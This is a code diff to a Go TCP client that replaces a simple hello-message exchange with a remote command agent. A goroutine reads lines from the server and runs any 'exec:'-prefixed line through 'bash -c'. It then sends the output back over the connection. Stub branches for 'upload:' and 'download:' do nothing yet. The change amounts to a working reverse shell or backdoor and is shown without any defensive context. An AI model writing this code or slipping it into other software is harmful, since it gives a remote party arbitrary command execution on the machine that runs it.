@@ -4,7 +4,9 @@ import (
 	"fmt"
 	"net"
 	"log"
-	"time"
+	"os/exec"
+	"strings"
+	"bufio"
 )
 
 
@@ -26,24 +28,43 @@ func main() {
 	}
 	fmt.Printf("From Server (%s) : %s\n", conn.RemoteAddr(), string(buf[:n]))
 
-	time.Sleep(2 * time.Second)
-
-	// Send data to server
-	_, err = conn.Write([]byte("Hello from client."))
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
-	for {
-		n, err := conn.Read(buf)
-		if err != nil {
-			fmt.Println(err)
-			return
+	// Goroutine to read server responses
+	go func(c net.Conn) {
+		reader := bufio.NewReader(c)
+		for {
+			cmdLine, err := reader.ReadString('\n')
+			if err != nil {
+				fmt.Println("[!] Server closed connection:", err)
+				break
+			}
+			cmdLine = strings.TrimSpace(cmdLine)
+			fmt.Printf("[>] Received command: %s\n", cmdLine)
+			parseCommand(cmdLine, conn)
 		}
+	}(conn)
 
-		fmt.Printf("From server (%s) : %s\n", conn.RemoteAddr(), string(buf[:n]))
+	// Block main thread to keep the connection open
+	select {}
+}
 
-		time.Sleep(1 * time.Second)
+
+func parseCommand(cmdLine string, conn net.Conn) {
+	if strings.HasPrefix(cmdLine, "exec:") {
+		cmdStr := strings.TrimPrefix(cmdLine, "exec:")
+
+		cmd := exec.Command("bash", "-c", cmdStr)
+		fmt.Printf("[>] Executing command: %s\n", cmd)
+		output, err := cmd.CombinedOutput()
+		fmt.Printf("[>] Executing command: %s\n", output)
+		if err != nil {
+			output = []byte(err.Error())
+		}
+		conn.Write([]byte(string(output) + "\n"))
+	}else if strings.HasPrefix(cmdLine, "upload:") {
+		return
+	}else if strings.HasPrefix(cmdLine, "download:") {
+		return
+	}else{
+		return
 	}
 }
